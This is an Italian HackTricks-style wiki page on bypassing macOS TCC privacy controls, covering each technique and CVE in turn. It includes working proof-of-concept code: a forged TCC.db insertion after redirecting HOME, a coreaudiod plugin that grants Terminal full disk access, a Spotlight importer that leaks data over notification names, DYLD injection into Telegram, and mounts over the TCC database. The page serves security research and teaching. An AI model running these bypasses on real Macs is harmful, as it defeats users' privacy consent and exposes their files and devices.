# Bypass di TCC in macOS

{{#include ../../../../../banners/hacktricks-training.md}}

## Per funzionalità

### Bypass di scrittura

Questo non è un bypass, è semplicemente il funzionamento di TCC: **non protegge dalla scrittura**. Se Terminal **non ha accesso in lettura alla Scrivania di un utente, può comunque scrivervi**:

```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```

L'attributo esteso **`com.apple.macl`** viene aggiunto al nuovo **file** per consentire all'**app dei creatori** di leggerlo.<sup>[[2]](#references)</sup>

### TCC ClickJacking

È possibile **sovrapporre una finestra alla richiesta di TCC** per indurre l'utente ad **accettarla** senza accorgersene. Puoi trovare una PoC in [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### Richiesta TCC con nome arbitrario

Un attaccante può **creare app con qualsiasi nome** (ad es. Finder, Google Chrome...) in **`Info.plist`** e farle richiedere l'accesso a una posizione protetta da TCC. L'utente penserà che sia l'applicazione legittima a richiedere questo accesso.\
Inoltre, è possibile **rimuovere l'app legittima dal Dock e sostituirla con quella falsa**: quando l'utente fa clic su quella falsa (che può usare la stessa icona), questa può avviare l'app legittima, richiedere i permessi TCC ed eseguire un malware, facendo credere all'utente che sia stata l'app legittima a richiedere l'accesso.<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Altre informazioni e PoC:

{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Per impostazione predefinita, l'accesso tramite **SSH aveva "Full Disk Access"**. Per disabilitarlo, è necessario che sia presente nell'elenco ma disattivato (rimuoverlo dall'elenco non eliminerà quei privilegi):<sup>[[2]](#references)</sup>

![Richiesta TCC con nome arbitrario - SSH Bypass: per impostazione predefinita, l'accesso tramite SSH aveva "Full Disk Access". Per disabilitarlo, è necessario che sia presente nell'elenco ma disattivato (rimuoverlo...](<../../../../../images/image (1077).png>)

Qui puoi trovare esempi di alcuni **malware che sono riusciti a bypassare questa protezione**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> Nota che ora, per poter abilitare SSH, è necessario **Full Disk Access**

### Gestione delle estensioni - CVE-2022-26767

L'attributo **`com.apple.macl`** viene assegnato ai file per concedere a una **determinata applicazione il permesso di leggerli**. Questo attributo viene impostato quando si trascina un file su un'app con **drag\&drop**, oppure quando l'utente fa **doppio clic** su un file per aprirlo con l'**applicazione predefinita**.

Di conseguenza, un utente potrebbe **registrare un'app dannosa** per gestire tutte le estensioni e chiamare Launch Services per **aprire** qualsiasi file (in questo modo, all'app dannosa verrà concesso l'accesso in lettura al file).<sup>[[23]](#references)</sup>

### iCloud

L'entitlement **`com.apple.private.icloud-account-access`** consente di comunicare con il servizio XPC **`com.apple.iCloudHelper`**, che **fornirà token iCloud**.

**iMovie** e **Garageband** avevano questo entitlement e altri che lo permettevano.

Per maggiori **informazioni** sull'exploit per **ottenere token iCloud** tramite quell'entitlement, guarda il talk: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### Esfiltrazione tramite nomi di notifiche Darwin del plugin di importazione di Spotlight

Un plugin di importazione di Spotlight può leggere il file che Spotlight gli passa nel callback `GetMetadataForFile`, anche quando un processo normale senza Full Disk Access non può leggerlo. A differenza dell'[iniezione di codice in un processo autorizzato da TCC](../macos-tcc-credential-and-data-theft.md), questo richiede un accesso locale sufficiente per installare un plugin di importazione e un evento di indicizzazione Spotlight corrispondente. Il plugin è in sandbox, ma le notifiche Darwin che contengono solo il nome possono trasmettere byte a un listener esterno alla sandbox. Questo è un canale di perdita di dati, non un modo per ottenere root o accedere liberamente ai file dal plugin di importazione.<sup>[[24]](#references)</sup>

Dichiara il tipo di file di destinazione sotto `CFBundleDocumentTypes` → `LSItemContentTypes` nell'`Info.plist` del plugin di importazione, quindi installa il bundle in `~/Library/Spotlight/` o in `Contents/Library/Spotlight/` di un'app. Verifica la registrazione con `mdimport -L`. La [sezione sui plugin di importazione di Spotlight](../../../../macos-auto-start-locations.md#spotlight-plugins) spiega dove posizionare i bundle e come associare i tipi di file. Il plugin riceve solo i file per i quali Spotlight lo seleziona; in genere, un plugin di importazione già esistente ha la precedenza. Su macOS 26 Tahoe, nei test riportati `mdimport -i` non forzava in modo affidabile l'indicizzazione ricorsiva immediata, mentre `mdimport -r ~/Library/Spotlight/Spotlight.mdimporter` richiedeva la reimportazione degli UTI dichiarati da quel plugin.<sup>[[24]](#references)</sup>

Per testare il canale, avvia un listener fuori dalla sandbox con `notifyutil -w TEST_TEST_TEST`, quindi invia una notifica con `CFNotificationCenterGetDarwinNotifyCenter()` e `NULL` come oggetto e `userInfo`. A differenza di una notifica distribuita con un payload `userInfo`, la notifica Darwin ha solo il nome. Per i dati binari, registra il listener esterno per i nomi decimali da `0` a `255` usando `notify_register_dispatch`; associa ogni registrazione del callback al relativo valore di byte. All'interno di `GetMetadataForFile`, leggi solo il `pathToFile` fornito da Spotlight e invia ogni byte come nome di notifica decimale:<sup>[[24]](#references)</sup>

```objectivec
NSData *data = readBytes(pathToFile); // helper reading Spotlight's selected file
const uint8_t *bytes = data.bytes;
for (NSUInteger i = 0; i < data.length; i++) {
    CFStringRef name = CFStringCreateWithFormat(NULL, NULL,
                                                 CFSTR("%u"), bytes[i]);
    CFNotificationCenterPostNotification(CFNotificationCenterGetDarwinNotifyCenter(),
                                         name, NULL, NULL, true);
    CFRelease(name);
}
```

Il listener ricostruisce la sequenza di byte invece di leggere direttamente il file protetto da TCC. Il PoC pubblicato ha recuperato i primi 64 byte di `knowledgeC.db` da un terminale non-FDA con SIP abilitato su macOS 26. La larghezza di banda è ridotta e non è un metodo affidabile per copiare grandi quantità di dati: Spotlight potrebbe non indicizzare o reindicizzare un file di destinazione e istanze concorrenti dell’importer possono intrecciare i flussi di notifiche. Consulta [macOS Sandbox Debug & Bypass](../../macos-sandbox/macos-sandbox-debug-and-bypass/) per altri meccanismi che sfruttano i confini della sandbox.<sup>[[24]](#references)</sup>

### kTCCServiceAppleEvents / Automation

Un’app con il permesso **`kTCCServiceAppleEvents`** potrà **controllare altre app**. Ciò significa che potrebbe essere in grado di **abusare dei permessi concessi alle altre app**.<sup>[[2]](#references)</sup>

Per ulteriori informazioni sugli Apple Scripts, consulta:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Ad esempio, se un’app ha il **permesso Automation su `iTerm`**, come in questo esempio in cui **`Terminal`** ha accesso a iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Su iTerm

Terminal, che non dispone di FDA, può chiamare iTerm, che ne dispone, e usarlo per eseguire azioni:

```applescript:iterm.script
tell application "iTerm"
    activate
    tell current window
        create tab with default profile
    end tell
    tell current session of current window
        write text "cp ~/Desktop/private.txt /tmp"
    end tell
end tell
```

```bash
osascript iterm.script
```

#### Tramite Finder

Oppure, se un'app ha accesso tramite Finder, potrebbe eseguire uno script come questo:

```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```

## Comportamento per app

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Il **daemon tccd** in userland utilizzava la variabile **`HOME`** **env** per accedere al database TCC dell'utente in: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Secondo [questo post su Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) e poiché il daemon TCC viene eseguito tramite `launchd` nel dominio dell'utente corrente, è possibile **controllare tutte le variabili d'ambiente** che gli vengono passate.<sup>[[19]](#references)</sup>\
Di conseguenza, un **attaccante potrebbe impostare la variabile d'ambiente `$HOME`** in **`launchctl`** affinché punti a una **directory** **controllata**, **riavviare** il daemon **TCC** e quindi **modificare direttamente il database TCC** per assegnarsi **ogni entitlement TCC disponibile**, senza mai chiedere conferma all'utente finale.<sup>[[1]](#references)</sup>\
PoC:

```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
                   VALUES('kTCCServiceSystemPolicyDocumentsFolder',
                   'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
                   NULL,
                   NULL,
                   'UNUSED',
                   NULL,
                   NULL,
                   1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```

### CVE-2021-30761 - Notes

Notes poteva accedere a posizioni protette da TCC, ma una nota appena creata veniva **salvata in una posizione non protetta**. Di conseguenza, un attacker poteva chiedere a Notes di copiare un file protetto in una nota e poi accedere ai dati risultanti dalla posizione non protetta:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Il binario `/usr/libexec/lsd`, insieme alla libreria `libsecurity_translocate`, aveva l'entitlement `com.apple.private.nullfs_allow`, che gli permetteva di creare mount **nullfs**, e l'entitlement `com.apple.private.tcc.allow` con **`kTCCServiceSystemPolicyAllFiles`** per accedere a tutti i file.

Era possibile aggiungere l'attributo di quarantena a "Library", chiamare il servizio XPC **`com.apple.security.translocation`** e ottenere così la mappatura di Library in **`$TMPDIR/AppTranslocation/d/d/Library`**, dove tutti i documenti all'interno di Library potevano essere **accessibili**.

### CVE-2024-44131 - FileProvider symlink race

Le app che delegano le operazioni sui file a un **privileged helper** (qui **`fileproviderd`** / `Files.app`) copiano o spostano elementi **per conto dell'utente**, quindi la copia viene eseguita con i privilegi dell'helper anziché con quelli del chiamante.

Jamf Threat Labs ha dimostrato che la convalida dei symlink eseguita prima dell'operazione può essere **soggetta a race condition**: invece di posizionare il symlink sull'ultimo componente del percorso (quello controllato), l'attacker sostituisce una directory **intermedia** del percorso **dopo che la copia è già iniziata**. Il privileged helper segue quindi il link controllato dall'attacker e legge/scrive in posizioni protette da TCC **senza mai mostrare una richiesta di autorizzazione**.<sup>[[5]](#references)</sup>

Le directory il cui percorso **non** è protetto da un UUID casuale (ad esempio `~/Library/Mobile Documents/com~apple~CloudDocs`) sono i bersagli più semplici, perché l'attacker può prevedere il percorso completo su cui creare la race condition.

> [!TIP]
> Questo è lo schema generico da cercare: **qualsiasi processo privilegiato che risolve un percorso più di una volta** (check-then-use oppure `rename()`/`copyfile()` che risolvono separatamente origine e destinazione) può essere soggetto a race condition sostituendo una directory nel mezzo del percorso. Solo `O_NOFOLLOW_ANY`, `openat()` su un FD di directory già aperto oppure `realpath()` seguito da una nuova convalida chiudono davvero la finestra.

Maggiori informazioni nell'[**articolo di Jamf Threat Labs**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` può essere compilata con `SQLITE_ENABLE_SQLLOG`, che aggiunge un hook di logging controllato da variabili d'ambiente ([`test_sqllog.c` upstream](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – per **ogni database aperto**, in `path` vengono scritti **una copia del file del database** e un log delle istruzioni SQL (la directory deve già esistere).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – crea **una nuova copia ogni volta** che viene aperto/allegato un DB, invece di riutilizzarne una.
- **`SQLITE_SQLLOG_CONDITIONAL`** – registra una connessione solo se accanto al DB principale esiste un file `<database>-sqllog`.

Se riesci a iniettare questa variabile in un processo che dispone di **FDA** e apre database SQLite, il processo copierà senza problemi **quei database protetti** in una directory sotto il tuo controllo. Poiché il nome del file di destinazione deriva da dati controllati dall'attacker, un **symlink posizionato nella destinazione** trasforma la stessa primitive in un **arbitrary file write** con i privilegi del processo bersaglio.

### **SQLITE_AUTO_TRACE**

Se la variabile d'ambiente **`SQLITE_AUTO_TRACE`** è impostata, la libreria **`libsqlite3.dylib`** inizierà a **registrare** tutte le query SQL. Molte applicazioni usavano questa libreria, quindi era possibile registrare tutte le loro query SQLite.<sup>[[22]](#references)</sup>

Diverse applicazioni Apple usavano questa libreria per accedere a informazioni protette da TCC.

```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```

### Ricerca di scritture su file controllate da variabili d'ambiente

Le due voci precedenti sono esempi della stessa tecnica generica, e vale la pena cercarne altri: **i framework caricati da app con privilegi TCC spesso espongono variabili d'ambiente di debug/logging che fanno sì che il processo crei un file in un percorso controllato dal chiamante**.

Procedura per individuarle:

1. Scegli un target con FDA o un altro permesso TCC interessante (`Music`, `TV`, `Terminal`, agenti MDM...) ed elenca i framework a cui è collegato (`otool -L`, `vmmap`).
2. Cerca stringhe `getenv` nei framework: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Imposta le variabili candidate con `launchctl setenv NAME /path/you/control`, avvia l'app e osserva le operazioni sul filesystem con `fs_usage -w -f filesys <pid>` o `sudo fs_usage | grep <path>`.
4. Se il processo **crea o rinomina** un file nella tua directory, hai una primitiva di scrittura: imposta la destinazione su un symlink (o sfrutta una race su una directory intermedia, come in CVE-2024-44131 qui sopra) per reindirizzarla a `~/Library/Application Support/com.apple.TCC/TCC.db`.

> [!TIP]
> Ci sono due fattori limitanti. Primo, le variabili **`DYLD_*` vengono ignorate dai binari con hardened runtime**, a meno che l'app non includa l'entitlement [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) ("un valore Boolean che indica se l'app può essere influenzata dalle variabili d'ambiente del dynamic linker, che si possono usare per iniettare codice nel processo dell'app"): vedi anche [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Secondo, Apple rimuove le singole variabili di debug dei framework non appena vengono segnalate, quindi una variabile che funzionava in una release di macOS spesso non è più disponibile nella successiva. Se un'app si rifiuta silenziosamente di avviarsi dopo averne impostata una, considera quella variabile già filtrata.<sup>[[7]](#references)[[8]](#references)</sup>

Vedi [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) per il trucco equivalente con le variabili del linker.

### Apple Remote Desktop

Come root, puoi abilitare questo servizio e **l'agente ARD avrà accesso completo al disco**. Un utente potrebbe quindi abusarne per fargli copiare un nuovo **database TCC dell'utente**.

## Tramite **NFSHomeDirectory**

TCC usa un database nella cartella HOME dell'utente per controllare l'accesso alle risorse specifiche dell'utente, in **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Pertanto, se l'utente riesce a riavviare TCC con una variabile d'ambiente $HOME che punta a una **cartella diversa**, può creare un nuovo database TCC in **/Library/Application Support/com.apple.TCC/TCC.db** e indurre TCC a concedere qualsiasi permesso TCC a qualsiasi app.

> [!TIP]
> Apple usa l'impostazione salvata nel profilo dell'utente, nell'attributo **`NFSHomeDirectory`**, come **valore di `$HOME`**. Pertanto, se comprometti un'app con i permessi necessari per modificare questo valore (**`kTCCServiceSystemPolicySysAdminFiles`**), puoi **weaponize** questa opzione per aggirare TCC.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

La **prima POC** usa [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) e [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) per modificare la cartella **HOME** dell'utente.

1. Ottieni un blob _csreq_ per l'app target.
2. Crea un file _TCC.db_ falso con gli accessi richiesti e il blob _csreq_.
3. Esporta la voce Directory Services dell'utente con [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Modifica la voce Directory Services per cambiare la directory home dell'utente.
5. Importa la voce Directory Services modificata con [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Arresta il _tccd_ dell'utente e riavvia il processo.

La seconda POC usava **`/usr/libexec/configd`**, che aveva `com.apple.private.tcc.allow` con valore `kTCCServiceSystemPolicySysAdminFiles`.\
Era possibile avviare **`configd`** con l'opzione **`-t`**, che consentiva a un attaccante di specificare un **Bundle personalizzato da caricare**. L'exploit **sostituisce** quindi il metodo basato su **`dsexport`** e **`dsimport`** per modificare la directory home dell'utente con una **code injection in `configd`**.

Per maggiori informazioni, consulta il [**report originale**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).<sup>[[11]](#references)</sup>

## Tramite process injection

Esistono diverse tecniche per iniettare codice in un processo e abusare dei suoi privilegi TCC:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Inoltre, la tecnica di process injection più comune per aggirare TCC è quella tramite **plugin (load library)**.\
I plugin sono codice aggiuntivo, solitamente sotto forma di librerie o plist, che viene **caricato dall'applicazione principale** ed eseguito nel suo contesto. Pertanto, se l'applicazione principale ha accesso a file soggetti a restrizioni TCC (tramite permessi concessi o entitlement), anche il **codice personalizzato ne avrà accesso**.

### CVE-2020-27937 - Directory Utility

L'applicazione `/System/Library/CoreServices/Applications/Directory Utility.app` aveva l'entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, caricava plugin con estensione **`.daplug`** e **non aveva l'hardened runtime**.

Per weaponize questa CVE, si **modifica** **`NFSHomeDirectory`** (abusando dell'entitlement precedente) per **assumere il controllo del database TCC dell'utente** e aggirare TCC.

Per maggiori informazioni, consulta il [**report originale**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

Il binario **`/usr/sbin/coreaudiod`** aveva gli entitlement `com.apple.security.cs.disable-library-validation` e `com.apple.private.tcc.manager`. Il primo **consentiva la code injection**, mentre il secondo gli permetteva di **gestire TCC**.

Questo binario consentiva di caricare **plugin di terze parti** dalla cartella `/Library/Audio/Plug-Ins/HAL`. Era quindi possibile **caricare un plugin e abusare dei permessi TCC** con questa POC:<sup>[[13]](#references)</sup>

```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
    CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

    CFStringRef bundleID = CFSTR("com.apple.Terminal");
    CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
    SecRequirementRef requirement = NULL;
    SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
    CFDataRef requirementData = NULL;
    SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

    TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

    add_tcc_entry();

    NSLog(@"[+] Exploitation finished...");
    exit(0);
```

Per maggiori informazioni, consulta il [**report originale**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[[13]](#references)</sup>

### Device Abstraction Layer (DAL) Plug-Ins

Le applicazioni di sistema che aprono uno stream della fotocamera tramite Core Media I/O (app con **`kTCCServiceCamera`**) caricano **nel processo questi plugin**, che si trovano in `/Library/CoreMediaIO/Plug-Ins/DAL` (non limitato da SIP).

È sufficiente archiviare lì una libreria con il **constructor** standard per **iniettare codice**.

Diverse applicazioni Apple erano vulnerabili a questo attacco.

### Firefox

L'applicazione Firefox aveva gli entitlement `com.apple.security.cs.disable-library-validation` e `com.apple.security.cs.allow-dyld-environment-variables`:<sup>[[14]](#references)</sup>

```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
    <true/>
    <key>com.apple.security.cs.disable-library-validation</key>
    <true/>
    <key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
    <true/>
    <key>com.apple.security.device.audio-input</key>
    <true/>
    <key>com.apple.security.device.camera</key>
    <true/>
    <key>com.apple.security.personal-information.location</key>
    <true/>
    <key>com.apple.security.smartcard</key>
    <true/>
</dict>
</plist>
```

Per maggiori informazioni su come sfruttare facilmente questa vulnerabilità, [**consulta il report originale**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[14]](#references)</sup>

### CVE-2020-10006

Il binario `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` aveva gli entitlement **`com.apple.private.tcc.allow`** e **`com.apple.security.get-task-allow`**, che permettevano di iniettare codice nel processo e usare i privilegi TCC.

### CVE-2023-26818 - Telegram

Telegram aveva gli entitlement **`com.apple.security.cs.allow-dyld-environment-variables`** e **`com.apple.security.cs.disable-library-validation`**, perciò era possibile abusare di questi entitlement per **ottenere accesso ai suoi permessi**, ad esempio per registrare con la fotocamera. Puoi [**trovare il payload nel writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[15]](#references)</sup>

Per usare la variabile d'ambiente per caricare una libreria, è stato creato un **plist personalizzato** per iniettare questa libreria ed è stato usato **`launchctl`** per avviarla:<sup>[[15]](#references)</sup>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
       <key>Label</key>
        <string>com.telegram.launcher</string>
        <key>RunAtLoad</key>
        <true/>
        <key>EnvironmentVariables</key>
        <dict>
          <key>DYLD_INSERT_LIBRARIES</key>
          <string>/tmp/telegram.dylib</string>
        </dict>
        <key>ProgramArguments</key>
        <array>
  <string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
        </array>
        <key>StandardOutPath</key>
        <string>/tmp/telegram.log</string>
        <key>StandardErrorPath</key>
        <string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```

## Tramite invocazioni di open

È possibile invocare **`open`** anche quando si è in sandbox

### Script del Terminale

È abbastanza comune concedere al Terminale **Full Disk Access (FDA)**, almeno sui computer usati da persone esperte di tecnologia. Inoltre, è possibile invocare script **`.terminal`** che lo utilizzano.

Gli script **`.terminal`** sono file plist come questo, con il comando da eseguire nella chiave **`CommandString`**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
    <key>CommandString</key>
    <string>cp ~/Desktop/private.txt /tmp/;</string>
    <key>ProfileCurrentVersion</key>
    <real>2.0600000000000001</real>
    <key>RunCommandAsShell</key>
    <false/>
    <key>name</key>
    <string>exploit</string>
    <key>type</key>
    <string>Window Settings</string>
</dict>
</plist>
```

Un'applicazione potrebbe scrivere uno script per il terminale in una posizione come /tmp e avviarlo con un comando come:

```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```

## Tramite mount

### CVE-2020-9771 - bypass di TCC e privilege escalation tramite mount_apfs

**Qualsiasi utente** (anche quelli senza privilegi) può creare e montare uno snapshot di Time Machine e **accedere a TUTTI i file** di quello snapshot.\
L’unico privilegio necessario è che l’applicazione utilizzata (come `Terminal`) abbia accesso **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), che deve essere concesso da un amministratore.<sup>[[2]](#references)</sup>

```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```

Una spiegazione più dettagliata si [**trova nel report originale**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 - Montare sopra il file TCC

Anche se il file DB di TCC è protetto, era possibile **montare sopra la directory** un nuovo file TCC.db:

```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
    os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
    os.system("mkdir /tmp/mnt")
    os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
    os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
    os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
    os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```

Controlla l'**exploit completo** nel [**writeup originale**](https://theevilbit.github.io/posts/cve-2021-30808/).<sup>[[21]](#references)</sup>

### CVE-2024-40855

Come spiegato nel [writeup originale](https://www.kandji.io/blog/macos-audit-story-part2), questa CVE sfruttava `diskarbitrationd`.<sup>[[16]](#references)</sup>

La funzione `DADiskMountWithArgumentsCommon` del framework pubblico `DiskArbitration` eseguiva i controlli di sicurezza. Tuttavia, è possibile aggirarli chiamando direttamente `diskarbitrationd` e usando quindi elementi `../` nel percorso e symlink.

Ciò consentiva a un attaccante di eseguire mount arbitrari in qualsiasi posizione, anche sovrascrivendo il database TCC, grazie all'entitlement `com.apple.private.security.storage-exempt.heritable` di `diskarbitrationd`.

### asr

Lo strumento **`/usr/sbin/asr`** consentiva di copiare l'intero disco e montarlo in un'altra posizione, aggirando le protezioni TCC.

### CVE-2022-22655 - Servizi di localizzazione

I Servizi di localizzazione **non** sono archiviati in un database TCC come gli altri servizi. Sono gestiti da `locationd`, che mantiene una propria allow-list in **`/var/db/locationd/clients.plist`**:<sup>[[4]](#references)</sup>

```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```

Ogni voce è indicizzata in base al client (bundle ID o percorso dell’eseguibile) e contiene campi come `Authorized`, `BundleId`, `Executable` e `Registered`.<sup>[[4]](#references)</sup>

Il file `clients.plist` è protetto da Sandbox/TCC e non può essere modificato nemmeno da root, ma **la directory `/var/db/locationd/` non era protetta dal montaggio**. Un aggressore con privilegi root poteva quindi creare un’immagine disco contenente il proprio `clients.plist` (con il proprio binario contrassegnato come `Authorized`), montarla sulla directory e riavviare `locationd` per applicare la allow-list contraffatta.<sup>[[3]](#references)</sup>

> [!TIP]
> È lo stesso schema dei bypass TCC con `hdiutil`/`mount` descritti sopra: il *file* è protetto, ma la *directory che lo contiene* no; quindi, invece di sostituire il file, si sostituisce l’intera directory.

## Tramite app di avvio


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Tramite grep

In diverse occasioni, i file memorizzano informazioni sensibili come email, numeri di telefono, messaggi... in posizioni non protette (cosa che Apple considera una vulnerabilità).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Click sintetici

Questo non funziona più, ma [**in passato funzionava**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Un altro metodo che usa gli [**eventi CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):<sup>[[17]](#references)</sup>

